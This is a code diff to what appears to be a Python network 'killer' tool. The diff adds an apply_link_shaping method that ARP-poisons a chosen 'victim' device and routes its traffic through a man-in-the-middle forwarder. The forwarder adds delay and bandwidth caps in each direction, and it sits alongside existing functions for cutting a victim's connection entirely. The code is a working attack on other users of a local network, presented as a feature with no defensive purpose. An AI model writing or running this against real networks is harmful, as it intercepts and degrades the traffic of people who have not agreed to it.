@@ -3,7 +3,7 @@ from time import sleep
 import sys
 import subprocess
 
-from networking.forwarder import MitmForwarder
+from networking.forwarder import MitmForwarder, _MAX_DELAY_MS, _MAX_SHAPING_KBPS
 from tools.pfctl import ensure_pf_enabled, install_anchor, block_all_for, unblock_all_for
 from tools.utils import (
     threaded,
@@ -178,6 +178,51 @@ class Killer:
 
     def disable_percent_cut(self, mac):
         self._stop_forwarder(mac)
+
+    def apply_link_shaping(
+        self,
+        victim,
+        *,
+        delay_ms_out=0,
+        delay_ms_in=0,
+        max_kbps_out=0.0,
+        max_kbps_in=0.0,
+        debug=False,
+    ):
+        """
+        ARP MITM forwarder with per-direction delay (queued) and/or token-bucket bandwidth caps.
+        Same reliability class as percent cut: requires traffic to traverse this forwarder.
+        """
+        if victim['mac'] not in self.killed:
+            self.kill(victim)
+        delay_ms_out = max(0, min(_MAX_DELAY_MS, int(delay_ms_out)))
+        delay_ms_in = max(0, min(_MAX_DELAY_MS, int(delay_ms_in)))
+        max_kbps_out = max(0.0, min(_MAX_SHAPING_KBPS, float(max_kbps_out)))
+        max_kbps_in = max(0.0, min(_MAX_SHAPING_KBPS, float(max_kbps_in)))
+
+        if victim['mac'] in self.forwarders:
+            self.forwarders[victim['mac']].stop()
+        if not self.router.get('mac'):
+            return
+        iface_to_use = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
+        if not iface_to_use or iface_to_use == 'NULL':
+            return
+        fw = MitmForwarder(debug=debug)
+        fw.start(
+            victim=victim,
+            router=self.router,
+            iface_name=iface_to_use,
+            iface_mac=self.iface.mac,
+            drop_from_victim=False,
+            drop_to_victim=False,
+            pass_from_victim_pct=100,
+            pass_to_victim_pct=100,
+            delay_ms_from_victim=delay_ms_out,
+            delay_ms_to_victim=delay_ms_in,
+            max_kbps_from_victim=max_kbps_out,
+            max_kbps_to_victim=max_kbps_in,
+        )
+        self.forwarders[victim['mac']] = fw
 
     @threaded
     def _kill_arp_worker(self, victim, wait_after=2, seq=0):
